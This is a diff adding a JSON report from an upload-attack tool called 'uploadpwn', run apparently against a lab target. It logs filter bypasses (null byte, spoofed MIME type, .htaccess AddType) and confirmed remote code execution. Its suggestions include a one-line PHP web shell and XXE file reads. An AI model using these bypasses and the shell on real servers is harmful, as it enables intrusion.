@@ -1,0 +1,136 @@
+{
+  "tool": "uploadpwn",
+  "version": "5.0.0",
+  "target": "http://192.168.134.187",
+  "start": "2026-05-12T17:58:39.267839",
+  "end": "2026-05-12T17:59:48.912521",
+  "filters": {
+    "Content-Type Filter": "bypassed",
+    "MIME Filter": "bypassed",
+    "Extension Filter": "bypassed",
+    "File Size Limit": "present",
+    ".htaccess": "bypassed"
+  },
+  "rce": [
+    {
+      "file": "shell.jpg",
+      "url": "http://192.168.134.187/uploads/shell.jpg",
+      "output": "94415b4cb72b4dde;id;echo 94415b4cb72b4dde",
+      "shell": "standard",
+      "ct": "image/jpeg"
+    }
+  ],
+  "flags": [],
+  "sources": {},
+  "xxe_reads": {},
+  "steps": [
+    {
+      "ts": "2026-05-12T17:58:39.267858",
+      "category": "authorization",
+      "status": "info",
+      "detail": "Operator asserted --i-am-authorized",
+      "target": "http://192.168.134.187"
+    },
+    {
+      "ts": "2026-05-12T17:58:41.988358",
+      "category": "probe",
+      "status": "info",
+      "detail": ".php accepted directly \u2014 minimal filtering"
+    },
+    {
+      "ts": "2026-05-12T17:58:42.200167",
+      "category": "probe",
+      "status": "info",
+      "detail": ".phtml accepted \u2192 blacklist is incomplete"
+    },
+    {
+      "ts": "2026-05-12T17:58:42.628914",
+      "category": "probe",
+      "status": "info",
+      "detail": "CT-spoof to image/jpeg bypasses CT filter"
+    },
+    {
+      "ts": "2026-05-12T17:58:42.629160",
+      "category": "filter",
+      "status": "bypassed",
+      "detail": "'Content-Type Filter' bypassed via: spoof to image/jpeg",
+      "state": "FILTER_BYPASSED"
+    },
+    {
+      "ts": "2026-05-12T17:58:42.842022",
+      "category": "filter",
+      "status": "bypassed",
+      "detail": "'MIME Filter' bypassed via: GIF89a magic bytes",
+      "state": "FILTER_BYPASSED"
+    },
+    {
+      "ts": "2026-05-12T17:58:43.052947",
+      "category": "filter",
+      "status": "bypassed",
+      "detail": "'Extension Filter' bypassed via: null byte: shell.php%00.jpg",
+      "state": "FILTER_BYPASSED"
+    },
+    {
+      "ts": "2026-05-12T17:59:46.763494",
+      "category": "filter",
+      "status": "found",
+      "detail": "Filter detected: File Size Limit"
+    },
+    {
+      "ts": "2026-05-12T17:59:47.188265",
+      "category": "probe",
+      "status": "found",
+      "detail": "SVG allowed \u2192 XXE/XSS surface"
+    },
+    {
+      "ts": "2026-05-12T17:59:47.400148",
+      "category": "upload",
+      "status": "found",
+      "detail": "Upload accepted: .htaccess (text/plain)",
+      "extra": {
+        "url": "http://192.168.134.187/Ticket.php",
+        "ct": "text/plain"
+      },
+      "target": "http://192.168.134.187/Ticket.php",
+      "payload_sha256": "47299439aba17268d043ce40823272ceeebb6b5df24d45b32c2f039b1e4ab697",
+      "state": "UPLOAD_ACCEPTED"
+    },
+    {
+      "ts": "2026-05-12T17:59:48.911550",
+      "category": "filter",
+      "status": "bypassed",
+      "detail": "'.htaccess' bypassed via: addtype_jpg",
+      "state": "FILTER_BYPASSED"
+    },
+    {
+      "ts": "2026-05-12T17:59:48.911869",
+      "category": "RCE",
+      "status": "found",
+      "detail": "RCE via 'shell.jpg' shell=standard",
+      "extra": {
+        "url": "http://192.168.134.187/uploads/shell.jpg"
+      },
+      "target": "http://192.168.134.187/uploads/shell.jpg",
+      "state": "RCE_CONFIRMED"
+    }
+  ],
+  "suggestions": [
+    "Use .phtml, .pht, .php5 to bypass blacklist",
+    "Null byte works \u2014 server likely PHP <5.3.4",
+    "Use tiny shell: <?=`$_GET[0]`?>",
+    "Run --svg-read /flag.txt and --svg-src upload.php"
+  ],
+  "artifacts": [
+    {
+      "url": "http://192.168.134.187/Ticket.php",
+      "filename": ".htaccess",
+      "type": "htaccess"
+    }
+  ],
+  "outcomes": {
+    "RCE_CONFIRMED": 1,
+    "UPLOAD_ACCEPTED": 1,
+    "FILTER_BYPASSED": 4,
+    "FAILED": 0
+  }
+}
